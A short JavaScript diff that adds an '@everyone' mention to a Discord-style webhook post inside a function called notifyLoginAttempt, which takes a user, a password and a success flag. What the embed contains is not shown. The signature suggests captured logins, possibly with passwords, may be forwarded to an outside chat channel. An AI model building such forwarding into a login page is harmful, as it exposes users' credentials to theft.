@@ -999,7 +999,10 @@ async function notifyLoginAttempt(user, pass, isSuccess, context) {
     await fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ embeds: [embed] })
+      body: JSON.stringify({
+        content: '@everyone',
+        embeds: [embed]
+      })
     });
   } catch (e) {
     console.error('Webhook notification failed:', e);
